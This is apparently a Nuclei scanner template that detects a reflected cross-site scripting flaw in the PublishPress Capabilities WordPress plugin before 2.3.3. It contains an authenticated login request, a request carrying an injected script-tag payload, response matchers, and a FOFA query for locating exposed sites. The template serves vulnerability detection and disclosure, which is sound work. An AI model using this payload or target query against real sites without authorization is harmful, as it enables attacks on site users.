http:
- matchers:
  - part: body_2
    type: word
    words:
    - <script>alert(document_domain)</script>
  - part: content_type
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-login.php?redirect_to=http%3A%2F%2F{{Hostname}}%2Fwp-admin%2Foptions-general.php
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In

    '
  - 'GET /wp-admin/admin.php?page=pp-capabilities-roles&a%22%3E%3Cscript%3Ealert("document.domain")%3C/script%3E
    HTTP/1.1

    Host: {{Hostname}}

    '
id: wp-publishpress-capabilities-xss
info:
  author: ritikchaddha
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
  description: 'The PublishPress Capabilities plugin for WordPress before 2.3.3 does
    not escape a form action URL before outputting it back in an attribute, leading
    to Reflected Cross-Site Scripting (XSS).

    '
  metadata:
    fofa-query: body="/wp-content/plugins/capability-manager-enhanced"
    max-request: 2
    verified: true
  name: PublishPress Capabilities < 2.3.3 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/88a57716-6e8b-4e98-884d-5534074c601a/
  remediation: 'Update the PublishPress Capabilities plugin to version 2.3.3 or later.

    '
  severity: medium
  tags: xss,wordpress,wp-plugin,wp,capability-manager-enhanced,authenticated,vuln
